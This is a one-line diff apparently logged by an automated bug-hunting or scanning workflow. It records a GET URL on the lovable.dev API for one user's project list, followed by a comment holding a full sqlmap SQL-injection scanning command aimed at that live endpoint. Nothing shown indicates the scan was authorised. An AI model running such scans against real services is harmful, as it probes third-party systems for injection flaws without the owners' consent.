@@ -1,0 +1,1 @@
+https://api.lovable.dev/users/26LOkZDiijS73yHSpEg7YftfCQ02/projects?limit=100&sort_by=updated_at&order=desc (GET)  # /usr/bin/sqlmap -u https://api.lovable.dev/users/26LOkZDiijS73yHSpEg7YftfCQ02/projects?limit=100&sort_by=updated_at&order=desc --batch --level=1 --risk=1 --smart --random-agent --output-dir=hunt_lovable.dev_20260308_094912/vulns/sqlmap_023822a5
